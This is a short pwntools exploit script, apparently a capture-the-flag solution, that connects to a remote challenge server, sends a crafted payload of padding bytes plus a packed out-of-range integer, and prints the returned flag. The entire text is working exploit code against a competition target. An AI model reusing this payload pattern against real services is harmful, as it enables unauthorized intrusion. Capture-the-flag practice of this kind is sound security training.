from pwn import *

context.binary = exe = ELF('./chal')
libc = ELF('./libc.so.6')

io = remote('amt.rs', 31630)

io.recvuntil(b'hex: \n')
payload = b'i'*28 + p32(0xFFFFFFC0)
io.sendline(payload)
flag = bytes.fromhex(io.recvline(keepends=False).decode())
print(flag)
io.interactive()
